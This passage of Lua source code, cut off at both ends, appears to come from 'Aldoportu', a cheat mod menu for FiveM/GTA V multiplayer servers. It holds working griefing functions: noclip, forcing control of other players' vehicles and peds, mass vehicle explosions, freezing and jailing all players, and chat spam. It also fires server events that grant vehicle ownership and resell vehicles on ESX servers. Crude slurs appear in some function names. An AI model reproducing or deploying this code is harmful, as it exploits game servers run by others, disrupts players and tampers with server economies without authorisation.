	SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
	
	if IsDisabledControlJustPressed(0, Keys['LEFTSHIFT']) then --[[ Change speed]]
		oldnoclipSpeed = noclipSpeed
		noclipSpeed = noclipSpeed * 2
	end
	if IsDisabledControlJustReleased(0, Keys['LEFTSHIFT']) then --[[ Restore speed]]
		noclipSpeed = oldnoclipSpeed
	end
	
	if Aldoportu.natives.isDisabledControlPressed(0, 32) then --[[ MOVE FORWARD]]
		x = x + noclipSpeed * dx
		y = y + noclipSpeed * dy
		z = z + noclipSpeed * dz
	end
	
	if Aldoportu.natives.isDisabledControlPressed(0, 269) then --[[ MOVE BACK]]
		x = x - noclipSpeed * dx
		y = y - noclipSpeed * dy
		z = z - noclipSpeed * dz
	end
	
	if Aldoportu.natives.isDisabledControlPressed(0, Keys['SPACE']) then --[[ MOVE UP]]
		z = z + noclipSpeed
	end
	
	if Aldoportu.natives.isDisabledControlPressed(0, Keys['LEFTCTRL']) then --[[ MOVE DOWN]]
		z = z - noclipSpeed
	end
	
	
	Aldoportu.natives.setEntityCoordsNoOffset(k, x, y, z, true, true, true)
end

Aldoportu.functions.magnetoMode = function()
    if Aldoportu.storedControls.magnetoMode then
        pCreateThread(function()
            local ForceKey = Keys[Aldoportu.keyBinds.currentKeybindMagneto.handle]
            local Force = 0.5
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
            local StartPush = false
            
            local function forceMagnetoTick()
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
                end
                if Aldoportu.natives.isDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                if (StartPush) then
                    StartPush = false
                    local pid = Aldoportu.datastore.pLocalPlayer.pedId
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in Aldoportu.trashFunctions.enumVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    for k in Aldoportu.trashFunctions.enumPeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                end
                if Aldoportu.natives.isDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                if (ForceEnabled) then
                    local pid = Aldoportu.datastore.pLocalPlayer.pedId
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    Markerloc = GetGameplayCamCoord() + (Aldoportu.trashFunctions.rotationToDirection(GetGameplayCamRot(2)) * 20)
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 35, false, true, 2, nil, nil, false)
                    
                    for k in Aldoportu.trashFunctions.enumVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                            Aldoportu.trashFunctions.reqControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Aldoportu.trashFunctions.forceOscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in Aldoportu.trashFunctions.enumPeds() do
                        if IsEntityOnScreen(k) and k ~= Aldoportu.datastore.pLocalPlayer.pedId then
                            Aldoportu.trashFunctions.reqControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Aldoportu.trashFunctions.forceOscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                end
            end
            
            while Aldoportu.storedControls.magnetoMode do forceMagnetoTick() pWait(0) end
        end)
    end
end

Aldoportu.functions.applyShockwave = function(entity, force)
	if not force then force = 50 end
    local pos = GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId)
    local coord = GetEntityCoords(entity)
    local dx = coord.x - pos.x
    local dy = coord.y - pos.y
    local dz = coord.z - pos.z
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    local distanceRate = (force / distance) * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(1, 10), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end

Aldoportu.functions.doForceFieldTick = function(radius)
    local player = Aldoportu.datastore.pLocalPlayer.pedId
    local coords = GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId)
    local playerVehicle = GetPlayersLastVehicle()
    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
    
    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
    
    for k in Aldoportu.trashFunctions.enumVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            Aldoportu.trashFunctions.reqControlOnce(k)
            Aldoportu.functions.applyShockwave(k, 50)
        end
    end
    
    for k in Aldoportu.trashFunctions.enumPeds() do
        if k ~= Aldoportu.datastore.pLocalPlayer.pedId and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2  and not IsPedAPlayer(k) then
			Aldoportu.trashFunctions.reqControlOnce(k)
			if NetworkHasControlOfEntity(k) then
				SetPedRagdollOnCollision(k, true)
				SetPedRagdollForceFall(k)
				Aldoportu.functions.applyShockwave(k, 50)
			end
        end
    end
end

Aldoportu.functions.randomClothes = function(target)
	pCreateThread(function() 
		local ped = GetPlayerPed(target)
		SetPedRandomComponentVariation(ped, false)
		SetPedRandomProps(ped)
	end)
end

Aldoportu.functions.spawnRandomTrain = function()
	if Aldoportu.datastore.trainRide.handle then
		DeleteMissionTrain(Aldoportu.datastore.trainRide.handle)
		Aldoportu.datastore.trainRide.trainSpeed = 5.0
		dir_print('Deleted train')
		Aldoportu.datastore.trainRide.handle = nil
		Aldoportu.datastore.trainRide.handleHasLoaded = false
		pWait(100)
		if Aldoportu.datastore.trainRide.oldCoords then
			Aldoportu.functions.teleportSelf(Aldoportu.datastore.trainRide.oldCoords.x, Aldoportu.datastore.trainRide.oldCoords.y, Aldoportu.datastore.trainRide.oldCoords.z)
		end
	else
		Aldoportu.datastore.trainRide.oldCoords = GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId)
		local cablecar = GetHashKey('cablecar')
		local metrotrain = GetHashKey('metrotrain')
		local freight = GetHashKey('freight')
		local freightcar = GetHashKey('freightcar')
		local freightgrain = GetHashKey('freightgrain')
		local freightcont1 = GetHashKey('freightcont1')
		local freightcont2 = GetHashKey('freightcont2')
		local freighttrailer = GetHashKey('freighttrailer')

		RequestModel(cablecar)
		RequestModel(metrotrain)
		RequestModel(freight)
		RequestModel(freightcar)
		RequestModel(freightgrain)
		RequestModel(freightcont1)
		RequestModel(freightcont2)
		RequestModel(freighttrailer)

		while (not HasModelLoaded(cablecar)) do pWait(0) end
		while (not HasModelLoaded(metrotrain)) do pWait(0) end
		while (not HasModelLoaded(freight)) do pWait(0) end
		while (not HasModelLoaded(freightcar)) do pWait(0) end
		while (not HasModelLoaded(freightgrain)) do pWait(0) end
		while (not HasModelLoaded(freightcont1)) do pWait(0) end
		while (not HasModelLoaded(freightcont2)) do pWait(0) end
		while (not HasModelLoaded(freighttrailer)) do pWait(0) end

		local c = GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, false)
		Aldoportu.datastore.trainRide.handle = CreateMissionTrain(24, c.x, c.y, c.z, 1)
		SetVehicleUndriveable(Aldoportu.datastore.trainRide.handle, false)
		TaskWarpPedIntoVehicle(Aldoportu.datastore.pLocalPlayer.pedId, Aldoportu.datastore.trainRide.handle, -1)
		dir_print('Spawned train')
		Aldoportu.datastore.trainRide.handleHasLoaded = true
	end

	if Aldoportu.datastore.trainRide.handleHasLoaded then
		if (Aldoportu.datastore.pLocalPlayer.cVehicle == Aldoportu.datastore.trainRide.handle) then
			local message = 'Train speed: ~b~' .. tostring(Aldoportu.datastore.trainRide.trainSpeed)

			if (GetGameTimer() >= timer) then
				SetTrainSpeed(Aldoportu.datastore.trainRide.handle, Aldoportu.datastore.trainRide.trainSpeed)
				timer = GetGameTimer() + 10
			end

			if (IsDisabledControlJustReleased(1, Keys['UP'])) then
				Aldoportu.datastore.trainRide.trainSpeed = Aldoportu.datastore.trainRide.trainSpeed + 0.1
			elseif (IsDisabledControlJustReleased(1, Keys['DOWN'])) then
				if (Aldoportu.datastore.trainRide.trainSpeed - 0.1 >= 0.0) then
					Aldoportu.datastore.trainRide.trainSpeed = Aldoportu.datastore.trainRide.trainSpeed - 0.1
				end
			end
		end
	end
end

Aldoportu.functions.spamChat = function(message)
	if Aldoportu.functions.game.isNullOrEmpty(message) then message = 'EsX_UmuT SikeR | ᛋᛋESX_UmuTᛋᛋ#0283' end
	for colorLoop=2,6 do
		Aldoportu.dTCE(true, true, '_chat:messageEntered','Aldoportu', {Aldoportu.mainColor.r,Aldoportu.mainColor.g,Aldoportu.mainColor.b},'^'..colorLoop..message)
		if Aldoportu.functions.doesResourceExist('esx_rpchat') then
			Aldoportu.dTCE(true, true, '_chat:messageEntered','Aldoportu', {Aldoportu.mainColor.r,Aldoportu.mainColor.g,Aldoportu.mainColor.b},'/ooc ^'..colorLoop..message)
			Aldoportu.dTCE(true, true, '_chat:messageEntered','Aldoportu', {Aldoportu.mainColor.r,Aldoportu.mainColor.g,Aldoportu.mainColor.b},'/ad ^'..colorLoop..message)
		end
	end
end

Aldoportu.functions.resetAppearance = function()
	ClearAllPedProps(Aldoportu.datastore.pLocalPlayer.pedId)
	ClearPedDecorations(Aldoportu.datastore.pLocalPlayer.pedId)
	SetPedComponentVariation(Aldoportu.datastore.pLocalPlayer.pedId, 1, 0, 0, 0)
	SetPedComponentVariation(Aldoportu.datastore.pLocalPlayer.pedId, 5, 0, 0, 0)
	SetPedComponentVariation(Aldoportu.datastore.pLocalPlayer.pedId, 9, 0, 0, 0)
end

Aldoportu.functions.changeAppearance = function(family, model, texture)
	if (family == 'HATS' or family == 'GLASSES' or family == 'EARS') then
		if (family == 'HATS') then
			fam = 0
		elseif (family == 'GLASSES') then
			fam = 1
		elseif (family == 'EARS') then
			fam = 2
		end
		SetPedPropIndex(Aldoportu.datastore.pLocalPlayer.pedId, fam, model - 1, texture, 1)
	else
		if (family == 'FACE') then
			fam = 0
		elseif (family == 'MASK') then
			fam = 1
		elseif (family == 'HAIR') then
			fam = 2
		elseif (family == 'TORSO') then
			fam = 3
		elseif (family == 'LEGS') then
			fam = 4
		elseif (family == 'HANDS') then
			fam = 5
		elseif (family == 'SHOES') then
			fam = 6
		elseif (family == 'SPECIAL1') then
			fam = 7
		elseif (family == 'SPECIAL2') then
			fam = 8
		elseif (family == 'SPECIAL3') then
			fam = 9
		elseif (family == 'TEXTURE') then
			fam = 10
		elseif (family == 'TORSO2') then
			fam = 11
		end
		SetPedComponentVariation(Aldoportu.datastore.pLocalPlayer.pedId, fam, model, texture, 0)
	end
end

Aldoportu.functions.killNearbyPeds = function()
	local playerPed = Aldoportu.datastore.pLocalPlayer.pedId
	local PedTab, PedCount = GetPedNearbyPeds(playerPed, 30, 30)
	for p in Aldoportu.trashFunctions.enumPeds() do
		if p ~= playerPed and not IsPedAPlayer(p) then
			Aldoportu.natives.setEntityHealth(p, 0)
			ExplodePedHead(p, GetHashKey('WEAPON_NIGHTSTICK'))
			SetPedToRagdoll(p, 6, 20, 20, true, true, true)
		end
	end
end

Aldoportu.functions.playerBlips = function()
	if Aldoportu.storedControls.visPlayerBlips then
		local plist = Aldoportu.natives.getActivePlayers()
		for i = 1, #plist do
			local id = plist[i]
			local ped = GetPlayerPed(id)
			if ped ~= Aldoportu.datastore.pLocalPlayer.pedId then
				local blip = GetBlipFromEntity(ped)

				--[[HEAD DISPLAY STUFF

				Create head display (this is safe to be spammed)
				headId = pInvoke( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, '', false )

				Speaking display
				I need to move this over to name tag code
				if NetworkIsPlayerTalking(id) then
					pInvoke( 0x63BB75ABEDC1F6A0, headId, 9, true )
				else
					pInvoke( 0x63BB75ABEDC1F6A0, headId, 9, false )
				end]]

				if not DoesBlipExist(blip) then
					blip = AddBlipForEntity(ped)
					SetBlipSprite(blip, 1)
					pInvoke( 0x5FBCA48327B914DF, blip, true ) 
				else
					local veh = GetVehiclePedIsIn(ped, false)
					local blipSprite = GetBlipSprite(blip)

					if GetEntityHealth(ped) == 0 then
						if blipSprite ~= 274 then
							SetBlipSprite(blip, 274)
							pInvoke( 0x5FBCA48327B914DF, blip, true ) 
						end
					elseif veh then
						local vehClass = GetVehicleClass(veh)
						local vehModel = GetEntityModel(veh)
						if vehClass == 15 then
							if blipSprite ~= 422 then
								SetBlipSprite(blip, 422)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehClass == 8 then
							if blipSprite ~= 226 then
								SetBlipSprite(blip, 226)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehClass == 16 then
							if vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or vehModel == GetHashKey('lazer') then 
								if blipSprite ~= 424 then
									SetBlipSprite(blip, 424)
									pInvoke( 0x5FBCA48327B914DF, blip, true) 
								end
							elseif blipSprite ~= 423 then
								SetBlipSprite(blip, 423)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehClass == 14 then 
							if blipSprite ~= 427 then
								SetBlipSprite(blip, 427)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or vehModel == GetHashKey('insurgent3') then
							if blipSprite ~= 426 then
								SetBlipSprite(blip, 426)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehModel == GetHashKey('limo2') then 
							if blipSprite ~= 460 then
								SetBlipSprite(blip, 460)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehModel == GetHashKey('rhino') then 
							if blipSprite ~= 421 then
								SetBlipSprite(blip, 421)
								pInvoke( 0x5FBCA48327B914DF, blip, false) 
							end
						elseif vehModel == GetHashKey('trash') or vehModel == GetHashKey('trash2') then 
							if blipSprite ~= 318 then
								SetBlipSprite(blip, 318)
								pInvoke( 0x5FBCA48327B914DF, blip, true) 
							end
						elseif vehModel == GetHashKey('pbus') then 
							if blipSprite ~= 513 then
								SetBlipSprite(blip, 513)
								pInvoke( 0x5FBCA48327B914DF, blip, false) 
							end
						elseif vehModel == GetHashKey('seashark') or vehModel == GetHashKey('seashark2') or vehModel == GetHashKey('seashark3') then
							if blipSprite ~= 471 then
								SetBlipSprite(blip, 471)
								pInvoke( 0x5FBCA48327B914DF, blip, false)
							end
						elseif vehModel == GetHashKey('cargobob') or vehModel == GetHashKey('cargobob2') or vehModel == GetHashKey('cargobob3') or vehModel == GetHashKey('cargobob4') then
							if blipSprite ~= 481 then
								SetBlipSprite(blip, 481)
								pInvoke( 0x5FBCA48327B914DF, blip, false)
							end
						elseif vehModel == GetHashKey('technical') or vehModel == GetHashKey('technical2') or vehModel == GetHashKey('technical3') then
							if blipSprite ~= 426 then
								SetBlipSprite(blip, 426)
								pInvoke( 0x5FBCA48327B914DF, blip, false)
							end
						elseif vehModel == GetHashKey('taxi') then
							if blipSprite ~= 198 then
								SetBlipSprite(blip, 198)
								pInvoke( 0x5FBCA48327B914DF, blip, true)
							end
						elseif vehModel == GetHashKey('fbi') or vehModel == GetHashKey('fbi2') or vehModel == GetHashKey('police2') or vehModel == GetHashKey('police3')
							or vehModel == GetHashKey('police') or vehModel == GetHashKey('sheriff2') or vehModel == GetHashKey('sheriff')
							or vehModel == GetHashKey('policeold2') then
							if blipSprite ~= 56 then
								SetBlipSprite(blip, 56)
								pInvoke( 0x5FBCA48327B914DF, blip, true)
							end
						elseif blipSprite ~= 1 then
							SetBlipSprite(blip, 1)
							pInvoke( 0x5FBCA48327B914DF, blip, true)
						end

						local passengers = GetVehicleNumberOfPassengers(veh)

						if passengers > 0 then
							if not IsVehicleSeatFree(veh, -1) then
								passengers = passengers + 1
							end
							ShowNumberOnBlip(blip, passengers)
						else
							HideNumberOnBlip(blip)
						end
					else
						HideNumberOnBlip(blip)

						if blipSprite ~= 1 then
							SetBlipSprite(blip, 1)
							pInvoke( 0x5FBCA48327B914DF, blip, true)

						end
					end

					SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
					SetBlipNameToPlayerName(blip, id)
					SetBlipScale(blip,  0.85)

					if IsPauseMenuActive() then
						SetBlipAlpha( blip, 255 )
					else
						x1, y1 = table.unpack(GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, true))
						x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
						distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900

						if distance < 0 then
							distance = 0
						elseif distance > 255 then
							distance = 255
						end
						SetBlipAlpha(blip, distance)
					end
				end
			end
		end
	elseif not Aldoportu.storedControls.visPlayerBlips then
		local plist = Aldoportu.natives.getActivePlayers()
		for i = 1, #plist do
			local id = plist[i]
			local ped = GetPlayerPed(id)
			local blip = GetBlipFromEntity(ped)
			if DoesBlipExist(blip) then
				RemoveBlip(blip)
			end
		end
	end
end

--[[allPlayersOptions]]
Aldoportu.functions.aPO = {}

Aldoportu.functions.aPO.freezeAll = function()
	for i=0, #Aldoportu.natives.getActivePlayers() do
		Aldoportu.natives.clearPedTasksImmediately(GetPlayerPed(i))
		ClearPedSecondaryTask(GetPlayerPed(i))
	end
end

Aldoportu.functions.aPO.disableDrivingCars = function()
	local plist = Aldoportu.natives.getActivePlayers()
	for i = 0, #plist do
		if IsPedInAnyVehicle(GetPlayerPed(i), true) then
			Aldoportu.natives.clearPedTasksImmediately(GetPlayerPed(i))
		end
	end
end

Aldoportu.functions.aPO.noisyVehicles = function()
	for k in Aldoportu.trashFunctions.enumVehicles() do
		SetVehicleAlarmTimeLeft(k, 60)
	end
end

Aldoportu.functions.aPO.explodeCars = function()
	for vehicle in Aldoportu.trashFunctions.enumVehicles() do
		if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
			Aldoportu.trashFunctions.reqControlOnce(vehicle)
			Aldoportu.natives.networkExplodeVehicle(vehicle, true, true, false)
		end
	end
end

Aldoportu.functions.aPO.rapeVehicles = function()
	for enumeratedVs in Aldoportu.trashFunctions.enumVehicles() do
		Aldoportu.functions.sPO.rapeVehicle(enumeratedVs)
    end
end

Aldoportu.functions.aPO.clonePeds = function()
	local plist = Aldoportu.natives.getActivePlayers()
	for i = 0, #plist do
		local Handle = GetPlayerPedScriptIndex(GetPlayerPed(i))
		--[[local Handle = GetPlayerPedScriptIndex(plist[i])]]
		ClonePed(Handle, 1, 1, 1)
	end
end

Aldoportu.functions.aPO.spawnTrollProp = function(prop)
	local plist = Aldoportu.natives.getActivePlayers()
	for i = 0, #plist do
		Aldoportu.functions.sPO.spawnTrollProp(GetPlayerPed(i), prop)
	end
end

Aldoportu.functions.aPO.giveAllWeapons = function(asPickup)
	for i = 0, #Aldoportu.natives.getActivePlayers() do
		Aldoportu.functions.sPO.giveAllWeapons(asPickup, GetPlayerPed(i))
	end
end

Aldoportu.functions.aPO.burnSFX = function()
	for trash=0, 50 do
		for i in Aldoportu.trashFunctions.enumPeds() do
			if not IsPedAPlayer(i) then
				RequestNamedPtfxAsset('core')
				UseParticleFxAssetNextCall('core')
				StartNetworkedParticleFxNonLoopedOnEntity('ent_sht_flame', i, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 15.0, false, false, false)
			end
		end
	end
end

Aldoportu.functions.aPO.flyingCars = function()
	for k in Aldoportu.trashFunctions.enumVehicles() do
		Aldoportu.trashFunctions.reqControlOnce(k)
		ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
	end
end

Aldoportu.functions.aPO.jail = function()
	for i = 0, #Aldoportu.natives.getActivePlayers() do
		Aldoportu.functions.sPO.jailTheFucker(GetPlayerServerId(i), 5391)
	end
end

Aldoportu.functions.aPO.unJail = function()
	for i = 0, #Aldoportu.natives.getActivePlayers() do
		Aldoportu.functions.sPO.unJailTheFucker(GetPlayerServerId(i), 5391)
	end
end

Aldoportu.functions.aPO.communityService = function()
	for i = 0, #Aldoportu.natives.getActivePlayers() do
		Aldoportu.functions.sPO.communityService(GetPlayerServerId(i))
	end
end

Aldoportu.functions.aPO.propBlock = function(index)
	pCreateThread(function()
		local e8 = -145066854
		RequestModel(e8)
		while not HasModelLoaded(e8) do
			pWait(0)
		end
		if Aldoportu.menuTables.trollsPropBlock.selected == 1 then
			local e9 = Aldoportu.natives.createObject(e8, 97.8, -993.22, 28.41, true, true, false)
			local ea = Aldoportu.natives.createObject(e8, 247.08, -1027.62, 28.26, true, true, false)
			local e92 = Aldoportu.natives.createObject(e8, 274.51, -833.73, 28.25, true, true, false)
			local ea2 = Aldoportu.natives.createObject(e8, 291.54, -939.83, 27.41, true, true, false)
			local ea3 = Aldoportu.natives.createObject(e8, 143.88, -830.49, 30.17, true, true, false)
			local ea4 = Aldoportu.natives.createObject(e8, 161.97, -768.79, 29.08, true, true, false)
			local ea5 = Aldoportu.natives.createObject(e8, 151.56, -1061.72, 28.21, true, true, false)
			SetEntityHeading(e9, 39.79)
			SetEntityHeading(ea, 128.62)
			SetEntityHeading(e92, 212.1)
			SetEntityHeading(ea2, 179.22)
			SetEntityHeading(ea3, 292.37)
			SetEntityHeading(ea4, 238.46)
			SetEntityHeading(ea5, 61.43)
			FreezeEntityPosition(e9, true)
			FreezeEntityPosition(ea, true)
			FreezeEntityPosition(e92, true)
			FreezeEntityPosition(ea2, true)
			FreezeEntityPosition(ea3, true)
			FreezeEntityPosition(ea4, true)
			FreezeEntityPosition(ea5, true)
		elseif Aldoportu.menuTables.trollsPropBlock.selected == 2 then
			local pd1 = Aldoportu.natives.createObject(e8, 439.43, -965.49, 27.05, true, true, false)
			local pd2 = Aldoportu.natives.createObject(e8, 401.04, -1015.15, 27.42, true, true, false)
			local pd3 = Aldoportu.natives.createObject(e8, 490.22, -1027.29, 26.18, true, true, false)
			local pd4 = Aldoportu.natives.createObject(e8, 491.36, -925.55, 24.48, true, true, false)
			SetEntityHeading(pd1, 130.75)
			SetEntityHeading(pd2, 212.63)
			SetEntityHeading(pd3, 340.06)
			SetEntityHeading(pd4, 209.57)
			FreezeEntityPosition(pd1, true)
			FreezeEntityPosition(pd2, true)
			FreezeEntityPosition(pd3, true)
			FreezeEntityPosition(pd4, true)
		elseif Aldoportu.menuTables.trollsPropBlock.selected == 3 then
			local cd1 = Aldoportu.natives.createObject(e8, -50.97, -1066.92, 26.52, true, true, false)
			local cd2 = Aldoportu.natives.createObject(e8, -63.86, -1099.05, 25.26, true, true, false)
			local cd3 = Aldoportu.natives.createObject(e8, -44.13, -1129.49, 25.07, true, true, false)
			SetEntityHeading(cd1, 160.59)
			SetEntityHeading(cd2, 216.98)
			SetEntityHeading(cd3, 291.74)
			FreezeEntityPosition(cd1, true)
			FreezeEntityPosition(cd2, true)
			FreezeEntityPosition(cd3, true)
		end
	end)
end

--[[selectedPlayerOptions]]
Aldoportu.functions.sPO = {}

Aldoportu.functions.sPO.spectatePlayer = function(target)
	Aldoportu.storedControls.sPOIsSpectating = not Aldoportu.storedControls.sPOIsSpectating
	local targetPed = GetPlayerPed(target)
	if Aldoportu.storedControls.sPOIsSpectating then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)
		RequestCollisionAtCoord(GetEntityCoords(targetPed))
		NetworkSetInSpectatorMode(true, targetPed)
		Aldoportu.functions.game.subtitle('Started spectating ~b~' .. GetPlayerName(target))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)
		Aldoportu.functions.game.subtitle('Stopped spectating ~b~' .. GetPlayerName(target))
	end
end

Aldoportu.functions.sPO.teleportToPlayer = function(target)
	local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(target)))
	Aldoportu.functions.teleportSelf(x, y, z)
end

Aldoportu.functions.sPO.teleportIntoVehicle = function(target)
	if not IsPedInAnyVehicle(target) then
		return Aldoportu.pushNotification('Player must be sitting in a vehicle!', 5000)
	end

	local vehicle = GetVehiclePedIsUsing(target)

	local seats = GetVehicleMaxNumberOfPassengers(vehicle)
	for i = 0, seats do
		if IsVehicleSeatFree(vehicle, i) then
			SetPedIntoVehicle(Aldoportu.datastore.pLocalPlayer.pedId, vehicle, i)
			break
		end
	end
end

Aldoportu.functions.sPO.SpawnVehicleToPlayer = function(modelName, playerIdx)
	if modelName and IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)
		while not HasModelLoaded(modelName) do pWait(0) end
		local model = (type(modelName) == 'number' and modelName or GetHashKey(modelName))
		local playerPed = GetPlayerPed(playerIdx)
		local SpawnedVehicle = Aldoportu.natives.createVehicle(model, GetEntityCoords(playerPed), GetEntityHeading(playerPed), true, true)
		local SpawnedVehicleIdx = NetworkGetNetworkIdFromEntity(SpawnedVehicle)
		SetNetworkIdCanMigrate(SpawnedVehicleIdx, true)
		SetEntityAsMissionEntity(SpawnedVehicle, true, false)
		SetVehicleHasBeenOwnedByPlayer(SpawnedVehicle, true)
		SetVehicleNeedsToBeHotwired(SpawnedVehicle, false)
		SetModelAsNoLongerNeeded(model)

		if NetworkHasControlOfEntity(playerPed) then
			SetPedIntoVehicle(playerPed, SpawnedVehicle, -1)
		end
		SetVehicleEngineOn(SpawnedVehicle, true, false, false)
		SetVehRadioStation(SpawnedVehicle, 'OFF')
		return SpawnedVehicle
	else
		Aldoportu.pushNotification('Invalid Vehicle Model!', 5000)
		return nil
	end
end

Aldoportu.functions.sPO.SpawnLegalVehicle = function(vehicalModelName, playerIdx, plateNumber)
	local SpawnedVehicle = Aldoportu.functions.sPO.SpawnVehicleToPlayer(vehicalModelName, playerIdx)
	if SpawnedVehicle ~= nil then
		if Aldoportu.functions.game.isNullOrEmpty(plateNumber) then 
			SetVehicleNumberPlateText(SpawnedVehicle, GetVehicleNumberPlateText(SpawnedVehicle))
		else 
			SetVehicleNumberPlateText(SpawnedVehicle, plateNumber) end
		Aldoportu.pushNotification('Spawned Vehicle', 5000)
		local SpawnedVehicleProperties = Aldoportu.functions.game.getVehicleProperties(SpawnedVehicle)
		local SpawnedVehicleModel = GetDisplayNameFromVehicleModel(SpawnedVehicleProperties.model)
		if SpawnedVehicleProperties then
			if Aldoportu.functions.doesResourceExist('esx_vehicleshop') then
				Aldoportu.dTCE(true, true, 'esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(playerIdx), SpawnedVehicleProperties, SpawnedVehicleModel, vehicalModelName, false)
			elseif Aldoportu.functions.doesResourceExist('esx_CryptosCustoms') then
				Aldoportu.dTCE(true, true, 'esx_CryptosCustoms:setVehicleOwnedPlayerId', GetPlayerServerId(playerIdx), SpawnedVehicleProperties, SpawnedVehicleModel, vehicalModelName, false)
			else
				Aldoportu.pushNotification('Resource was not found!', 5000)
			end
		end
	end
end

Aldoportu.functions.sPO.ESXSellVehicle = function()
	if IsPedInAnyVehicle(GetPlayerPed(-1)) then
		if Aldoportu.datastore.ESX ~= nil then
			local vehicleProperties = Aldoportu.functions.game.getVehicleProperties(GetVehiclePedIsIn(GetPlayerPed(-1), false))
			if Aldoportu.functions.doesResourceExist('esx_vehicleshop') then
				Aldoportu.datastore.ESX.TriggerServerCallback('esx_vehicleshop:resellVehicle', function(vehicle_sold) end, vehicleProperties.plate, vehicleProperties.model)
			elseif Aldoportu.functions.doesResourceExist('esx_CryptosCustoms') then
				Aldoportu.datastore.ESX.TriggerServerCallback('esx_CryptosCustoms:resellVehicle', function(vehicle_sold) end, vehicleProperties.plate, vehicleProperties.model)
			else
				Aldoportu.pushNotification('Resource was not found!', 5000)
			end
		else 
			Aldoportu.pushNotification('Could not find ESX, try refresing it in the settings tab', 5000)
		end
	else 
		Aldoportu.pushNotification('You must be in a vehicle to use this!', 5000) 
	end
end

Aldoportu.functions.sPO.cloneVehicle = function(target)
	local selectedPlayerVehicle = nil
	if IsPedInAnyVehicle(GetPlayerPed(target)) then selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), false)
	else selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), true) end

	if DoesEntityExist(selectedPlayerVehicle) then
		local vehicleModel = GetEntityModel(selectedPlayerVehicle)
		local spawnedVehicle = Aldoportu.functions.sPO.SpawnVehicleToPlayer(vehicleModel, PlayerId())

		local vehicleProperties = Aldoportu.functions.game.getVehicleProperties(selectedPlayerVehicle)
		vehicleProperties.plate = nil

